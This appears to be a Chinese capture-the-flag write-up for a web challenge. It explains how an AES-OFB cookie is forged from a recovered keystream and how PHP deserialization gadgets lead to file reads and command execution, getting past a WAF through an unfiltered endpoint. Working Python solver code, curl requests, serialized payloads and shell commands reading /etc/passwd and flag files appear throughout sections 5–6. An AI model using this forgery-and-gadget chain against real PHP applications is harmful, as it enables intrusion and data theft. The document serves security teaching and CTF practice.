# web03 · i like escape（流密码 cookie 已知明文伪造 + PHP 反序列化 RCE）

| 项 | 值 |
|----|----|
| 轮次 | 环节二（13:30） |
| 平台题目名 | web03 |
| 比赛 qid | KQ6JKe9T37LEAz_z |
| 分类 | web |
| 分值 | 500 |
| 交互型 | true（容器） |
| 关键 flag | `flag{7386fc3b-9ec1-428c-aff3-483317221af0}` |
| 是否解出 | 已解出 |
| **还原完整度** | **B**（7 个 PHP 文件按 WP + 参考脚本重建，Dockerfile/compose 可起容器并已实测打通全链；密钥值为等价重建） |

## 1. 题面（比赛原文，逐字保留）

> i like escape源码在/www.zip（本题下发后，请通过http访问相应的ip和port，例如 nc ip port ，改为http://ip:port/）

题面直接点名**源码在 `/www.zip`** —— 这是一道"源码泄露 + 白盒审计"型题，
不给源码包的话第二步（自研加密的格式）几乎无法可靠推出。

## 2. 附件与环境

| 项 | 内容 |
|----|------|
| 附件 | **无附件**（`file_url` 为空串）；但容器内含 `/www.zip` 源码包（题面提示） |
| 容器 | 原始 `nc 123.56.12.16 26753` → 即 `http://123.56.12.16:26753/`（**会随平台 reset 变化**） |
| 附件存放 | `attachments/`（无原始附件，保留 `.gitkeep` 占位） |
| 源码下载 | `solve/www.zip` 是**从本地重建容器**导出的派生产物（非比赛原始件，已在 §8 标注） |
| 部署件 | `deploy/`（php:7.4-apache，7 个 PHP 文件 + entrypoint 注入 flag 与生成 `/www.zip`） |

源码包内 6 个文件（重建件同构）：

| 文件 | 作用 |
|------|------|
| `index.php` | 登录页 = **加密预言机**：`setcookie('user', base64(encrypt(serialize(new Users(...)))))` |
| `login.php` | 解密 + `unserialize`（cookie 名 `user`），会过 `a()` 过滤 |
| `eeeeeend1ng.php` | 解密 + `unserialize`（cookie 名 `users`），**不过 `a()` 过滤** ← RCE 落地点 |
| `function.php` | gadget：`FILE::__destruct` 任意读、`Date::__destruct` → `system()`、`admin`、`Users` |
| `waf.php` | `a()` 子串黑名单 + `b()` = `serialize()` |
| `algorithm.php` | 自研加密：`base64($ct) . '::' . bin2hex($iv)`，`aes-128-ofb` + `OPENSSL_ZERO_PADDING` |

## 3. 考点（★核心）

- **考点 1 — 流模式密码无 PKCS#7 ⇒ 密文长度 == 明文长度 ⇒ 已知明文恢复 keystream。**
  `algorithm.php` 用 `openssl_encrypt($pt, 'aes-128-ofb', $key, OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING, $iv)`：
  ① `ZERO_PADDING` 关掉 PKCS#7，② OFB/CTR 的 keystream **只由 (key, iv) 决定**，
  与明文、密文都无关。于是 `ct = pt XOR ks`、`ks = pt XOR ct`。
  实测 `pt_len == ct_len`（164 == 164）—— **这一步就排除了 CBC**（CBC 必有填充，长度会上取整到 16 的倍数）。
  攻击者用 `username='P'*64` 让明文完全可预测，一次登录拿到 164 字节 keystream，
  之后可伪造**任意等长或更短**的明文（含任意 PHP 序列化对象）。
  ⚠️ **必须是 OFB/CTR，不能是 CFB**：CFB 的 keystream 反馈的是**密文**，
  伪造的密文一变短，第 1 个分组之后的 keystream 就与原样本不同
  （本地实测：CFB 下伪造 49 字节时前 16 字节正确、之后全是乱码；
  换成 OFB 后 49/51/164 字节全部正确）。这是本题最隐蔽的一个"密码学性质"卡点。
- **考点 2 — PHP 反序列化，两条 gadget 链。**
  解密后的明文直接进 `unserialize()`，**没有 `allowed_classes` 白名单**：
  - 任意文件读：`O:4:"FILE":1:{s:8:"filename";s:5:"/flag";}` → `FILE::__destruct()` 里 `echo file_get_contents($this->filename)`
  - 命令执行：`O:5:"admin":2:{s:5:"admin";N;s:4:"root";O:4:"Date":1:{s:3:"cmd";s:N:"...";}}`
    → admin 被销毁时连带销毁它持有的 `Date` 对象 → `Date::__destruct()` → `system($cmd)`
  两个都可用，但**只有 RCE 能拿到 flag**（考点 3 解释了为什么）。
- **考点 3 — flag 是随机文件名 + `/eeeeeend1ng.php` 不过 WAF。**
  flag 藏在 `/flag_<18位hex>`（比赛实测 `/flag_182e805265d83db03d9c`），
  所以 `FILE` gadget 读 `/flag` 会得到 `file_get_contents failed to open stream`。
  `index.php` / `login.php` 都 `require waf.php` 并调用 `a()`（`stripos` 子串黑名单，
  含 `system / FILE / Date / admin / flag` 等词）；而 **`eeeeeend1ng.php` 完全不 require `waf.php`** ——
  只盯 `login.php` 打 payload 的人会一直吃 `Hacker!`，必须切到 `eeeeeend1ng.php` 才能 RCE。
- **考点 4 — cookie 的双层 base64 与 URL 编码细节。**
  cookie 值 = `base64( base64($ct) . '::' . bin2hex($iv) )`。
  PHP `setcookie()` 会把 `=` 编码成 `%3D`，内层 base64 的 `=` padding 在拼接/编码过程中被吃掉，
  所以解析端必须 `urllib.parse.unquote()` → `strip('"')` → 把 `' '` 还原成 `'+'` → **重新补 `=` padding**，
  两层都要补。不补 padding 就 `base64_decode(..., true)` 返回 false，链子静默断在第一步。

## 4. 设计思路（★核心）

- **为什么这样出**：把三个独立漏洞**串成一条必须按顺序走的链**：
  源码泄露（给白盒）→ 自研加密的长度侧信道（给 keystream）→ 反序列化（给 RCE）。
  任何一环缺失都拿不到 flag，但又**每一环都有明确的可观测信号**（200/长度相等/`Hacker!`），
  适合考察"读源码 + 做密码学判断 + 走对端点"的完整能力。
- **难度卡点设计在哪**：
  1. **长度相等**这个信号极容易被忽略。很多人看到 base64 + IV 就默认是 AES-CBC，
     然后去试 CBC 剪切粘贴（`solve/web03_solve.py` 里就保留了这条路线 B），
     在本题会失败 —— 必须先量 `pt_len == ct_len` 才能定成流模式。
  2. **OFB vs CFB** 的区别只在"伪造的密文比原样本短"时才暴露。
     如果只用 164 字节等长 payload 测试（比如把整个对象补齐到 164），CFB 也能过；
     一旦换成 41 字节的 `FILE` 对象就崩。这个坑本地重建时真实踩到过（见 §8）。
  3. **端点选择**：`login.php` 与 `eeeeeend1ng.php` 做几乎一样的事，
     但一个过滤一个不过滤，且 **cookie 名不同**（`user` vs `users`）。
- **干扰项 / 诱导项**：
  1. `waf.php` 的 `a()` 黑名单就是最大的干扰项。它让 `login.php` 上的 RCE payload 直接 `die('Hacker!')`，
     诱导结论"反序列化被防住了"；实际上 `eeeeeend1ng.php` 根本没引它。
     诱导还体现在命名上：`eeeeeend1ng.php`（一串 e）像是"彩蛋/结局页"，
     容易被当成无关装饰而跳过。
  2. `FILE` gadget 能读文件、`login.php` 也能打通，**给了一种"我已经利用了"的假成功感**；
     但 `file_get_contents('/flag')` 必然失败 —— 从而逼你去 RCE。
  3. flag 的**随机文件名**本身是干扰：它让"任意文件读"这个更简单的原语无效，
     必须升级到命令执行（或先 RCE 列目录再读）。
- **哪些地方是"必须踩坑才会发现"的**：
  - **必须比对长度**才知道是流模式（否则会在 CBC 剪切粘贴上空转）。
  - **必须切到 `eeeeeend1ng.php`** 才能绕过 `a()`。
  - 回显位置：`FILE::__destruct` 与 `Date::__destruct` 的输出都落在 **`</html>` 之后**，
    只解析 HTML 中间区域的工具会看不到命令回显 —— flag 正则必须扫**整个响应体**。

## 5. 解题路径（按真实过程，分步骤）

1. **侦察**：拿地址，下载源码包并审计。

   ```bash
   curl -s -o www.zip "http://123.56.12.16:26753/www.zip" && unzip -o www.zip -d www
   # www/{index.php,login.php,function.php,waf.php,algorithm.php,eeeeeend1ng.php}
   ```

2. **单点突破 ①：量长度，定模式。** 用完全可预测的明文探一次：

   ```bash
   curl -s -i -X POST "http://123.56.12.16:26753/index.php" \
        -d 'username=PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP&passwd=x' \
        | grep -i set-cookie
   ```

   PHP 侧明文 = `serialize(new Users('P'*64, 'x', 'True'))`，长度恒为 **164**：

   ```
   O:5:"Users":3:{s:15:"\0Users\0username";s:64:"<64 个 P>";s:13:"\0Users\0passwd";s:1:"x";s:6:"status";s:4:"True";}
   ```

   解析 cookie（两层 base64 + 补 padding）后得到 `ct`（164B）与 `iv`（16B）：
   **`ct_len == pt_len` ⇒ 无 PKCS#7 ⇒ 流模式**，于是

   ```python
   ks = bytes(a ^ b for a, b in zip(pt, ct))     # 164 字节 keystream
   ```

3. **单点突破 ②：伪造 FILE 对象（验证 keystream 有效）。**

   ```python
   obj = b'O:4:"FILE":1:{s:8:"filename";s:5:"/flag";}'
   ct  = bytes(a ^ b for a, b in zip(obj, ks))
   # cookie = base64( base64(ct) + '::' + iv.hex() )
   ```

   打 `login.php`（cookie 名 `user`）→ `file_get_contents(/flag): failed to open stream`
   ⇒ **flag 不是 `/flag`，是随机文件名**。
   （顺带可用 `O:4:"FILE":{..."/etc/passwd"...}` 确认任意文件读确实成立。）

4. **单点突破 ③：换 RCE 链 + 换端点。** 构造 `admin → root(Date) → system` 并打
   **`eeeeeend1ng.php`**（cookie 名 `users`）：

   ```python
   cmd = b'ls -la /;cat /flag* 2>&1'
   obj = (b'O:5:"admin":2:{s:5:"admin";N;s:4:"root";'
          b'O:4:"Date":1:{s:3:"cmd";s:' + str(len(cmd)).encode() + b':"' + cmd + b'";}}')
   ```

5. **取 flag**：`ls -la /` 回显里看到 `/flag_182e805265d83db03d9c`，再精确读：

   ```bash
   # 同一条链，把 cmd 换成 cat /flag_182e805265d83db03d9c
   # -> flag{7386fc3b-9ec1-428c-aff3-483317221af0}
   ```

## 6. 参考解法（代码）

```python
# solve/solve.py 核心片段（完整可跑，参数化 --target）

def php_ser_rce(cmd: str) -> bytes:
    """admin -> root(Date) -> system() gadget"""
    cb = cmd.encode()
    return (b'O:5:"admin":2:{s:5:"admin";N;s:4:"root";'
            b'O:4:"Date":1:{s:3:"cmd";s:' + str(len(cb)).encode() + b':"' + cb + b'";}}')

def parse_cookie(cookie_val: str):
    """PHP setcookie 的 URL 编码 + 内层 base64 padding 丢失都要处理"""
    v = urllib.parse.unquote(cookie_val.strip().strip('"')).replace(' ', '+')
    v += '=' * (-len(v) % 4)                       # 外层 padding
    inner = base64.b64decode(v).decode('latin-1')
    ct_b64, iv_hex = inner.split('::', 1)
    ct_b64 = ct_b64.strip(); ct_b64 += '=' * (-len(ct_b64) % 4)   # ★ 内层 padding
    return base64.b64decode(ct_b64), binascii.unhexlify(iv_hex.strip())

# 1) 预言机 -> keystream（164B）
ct, iv = parse_cookie(login(b'P' * 64))
ks = bytes(a ^ b for a, b in zip(php_ser_users(b'P' * 64, b'x'), ct))

# 2) RCE（必须打 eeeeeend1ng.php 且 cookie 名是 users）
body = fire('/eeeeeend1ng.php', 'users', php_ser_rce('cat /flag* /var/www/html/flag* 2>&1'))
```

参见 `solve/solve.py`（含 `--dump-source`、`--target`、FILE/RCE 双链与随机文件名自动跟进）。

## 7. Flag 与验证记录

| 项 | 值 |
|----|----|
| flag | `flag{7386fc3b-9ec1-428c-aff3-483317221af0}` |
| 提交接口返回 | `code=0`，`status=null`，`message="恭喜您，回答正确"`，`pass=true`（题目 `is_solved` 变为 true） |
| 提交时间 | 2026-09-14 13:36:35 |
| 提交接口 | `/ff874ef3172cbf4fd6ec2c5653a568e2?token=&question_id=KQ6JKe9T37LEAz_z&answer=<flag>` |
| 证据文件 | `work/submit_results_live.json` 内该 qid 的回执；WP 原文 `work/_wp_dump/web03.txt` |
| 中间过程 | `/flag` 读取失败（随机名）→ `ls -la /` 得到 `/flag_182e805265d83db03d9c` |

## 8. 还原说明（诚实写）

- **已有原始件**：
  - 题面原文（来自 `challenges_live.json`，逐字一致）。
  - 容器地址（`connection.docker_url` / `docker_ip` / `docker_port`）。
  - flag 与提交回执（平台已验证 `status=1`）。
  - 参考脚本三份：`work/web03_solve.py`、`work/web03b.py`、`work/web03c.py`。
  - **源码不是原始件**：比赛期间**没有把 `/www.zip` 落盘归档**，只留下了脚本里对
    `algorithm.php` / `function.php` / `waf.php` 行为的确切描述（含类名、属性名、
    私有属性 NUL 前缀、cookie 结构与端点差异）。7 个 PHP 文件据此重建。
- **重建部分**：
  - **7 个 PHP 文件**：`index.php`（加密预言机）、`login.php`、`eeeeeend1ng.php`、
    `function.php`（`FILE`/`Date`/`Users`/`admin`）、`waf.php`（`a()`/`b()`）、`algorithm.php`（`Cipher`）。
    类名、属性名、gadget 形态、cookie 双层 base64 结构、`a()` 的黑名单与 `stripos` 语义、
    两个端点的 cookie 名差异（`user` vs `users`）**都与 WP 记录一致**。
  - **密钥值是等价重建**：`$key = 'i_like_escape_2026'`。比赛环境里 `$algorithm` 与
    `$secret_key` 定义在未泄露的 `config.php` 中；本地重建用固定值，
    **不影响任何考点**（攻击者本来就不需要密钥 —— 全部靠 keystream 伪造）。
  - **加密模式选 `aes-128-ofb`**：这是本地实测**反推**出来的。第一版我按"流模式"随手选了
    `aes-128-cfb`，结果伪造 41/49 字节 payload 时解密结果只有前 16 字节正确、之后全是乱码 ——
    原因正是 CFB 的 keystream 反馈密文。改用 OFB 后 49/51/164 字节全部正确。
    ⇒ **原题的"已知明文恢复 keystream 后可伪造任意等长明文"这一性质，数学上要求 OFB 或 CTR。**
    这是一条由"利用可行性"反推出实现细节的还原结论，已在 §3 考点 1 写明。
  - **flag 注入**：`entrypoint.sh` 把 `COPY` 进来的 `/flag` 搬到随机名
    `/var/www/html/flag_<18位hex>`（还原原题 `/flag_182e805265d83db03d9c`），并删除 `/flag`，
    同时用 `zip` 生成 `/www.zip`（还原题面点名的源码泄露入口）。
  - `deploy/src/` 里的 PHP 注释为中文 —— 这些是**通过 HTTP 源码包泄露**的文本（不是二进制），
    不影响 printable-run 类扫描；且 `/www.zip` 由 entrypoint 现打包，内容自洽。
- **未能还原**：比赛原始 `/www.zip` 字节、`config.php` 的真实密钥/算法名、
  比赛容器的 PHP/Apache 版本、flag 随机后缀的实际生成方式（本地用 `od -An -tx1 /dev/urandom`）。
- **可复现性验证**（已实测，全链打通）：

  ```text
  [*] GET /www.zip -> 200 len=7444                # 源码泄露入口
  [*] pt_len=164  ct_len=164  iv=<16B>            # 考点 1：流模式判定
  [*] 流模式判定: ct_len == pt_len → 无 PKCS#7；ks = pt XOR ct 恢复 164 字节
      [ok] keystream 自检通过
  [FILE:/flag] /login.php -> 200 len=162          # 考点 3：随机文件名 → 读不到
  [RCE:cat /flag* /var/www/ht] /eeeeeend1ng.php -> 200 len=254
  [+] FLAG = flag{local-r2-web03-i-like-escape-keystream-forge}
  [+] 取得方式: RCE (users cookie): cat /flag* /var/www/html/flag* 2>&1
  ```

  测试顺序中刻意验证过的对照项（都通过）：
  - 用**原样 cookie** 回打 `login.php` → `unserialize` 得到 `Users`（证明编解码自洽）；
  - forged `FILE` 读 `/etc/passwd` → 完整回显（证明任意文件读 + keystream 伪造有效）；
  - forged `FILE` 读 `/flag` → 失败（证明随机文件名这一设计）；
  - forged RCE 打 `eeeeeend1ng.php` → `ls -la /` 完整回显（证明 gadget 链 + 端点选择正确）。

## 9. 复现步骤

```bash
cd timu/round2_1330/web03

# ① 起容器（本地映射端口 8080）
docker compose -f deploy/docker-compose.yml up -d --build
# 容器内会做三件事：注入随机名 flag、生成 /www.zip、起 apache

# ② 打靶（--dump-source 顺便把 /www.zip 存到 solve/www.zip）
python solve/solve.py --target http://127.0.0.1:8080 --dump-source

# ③ 机读输出
python solve/solve.py --target http://127.0.0.1:8080 --json

# ④ 收工
docker compose -f deploy/docker-compose.yml down -v
```

固定 flag 文件名（便于断言，跳过随机名这一步）时：

```bash
FLAG_RANDOM_SUFFIX=fixed docker compose -f deploy/docker-compose.yml up -d --build
# flag 落在 /var/www/html/flag_fixed
```

> 复现要点两条：
> ① **加密必须是 OFB/CTR**（`deploy/src/algorithm.php` 的 `$algorithm = 'aes-128-ofb'`）。
> 换成 CFB 会让 `FILE`/RCE 这类短 payload 的伪造失败 —— 那正是本题"能不能伪造任意等长明文"的分水岭。
> ② **`eeeeeend1ng.php` 绝不能 `require waf.php`**，否则 RCE 链被断，题就只剩任意文件读。
